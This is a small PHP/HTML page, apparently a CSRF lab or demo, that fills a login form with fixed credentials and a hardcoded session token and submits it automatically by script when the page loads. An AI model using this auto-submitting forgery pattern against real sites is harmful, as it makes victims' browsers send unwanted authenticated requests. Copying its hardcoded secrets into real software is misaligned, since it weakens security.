<html>

<body>

<?php 
    $_SESSION["confirmation"] = "abc123";
?>
<form method="POST" id="csfr_form" action="csfr.php">
    <input type="text" name="username" id="username" value="host" required>
    <input type="password" placeholder="" name="password" id="password" value="pass" required>
    <input type="hidden" name="hidden" id="hidden">
</form>

<script>
document.getElementById("hidden").value = "<?php echo $_SESSION["confirmation"] ?>"
document.getElementById("csfr_form").submit()</script>

</body>

</html>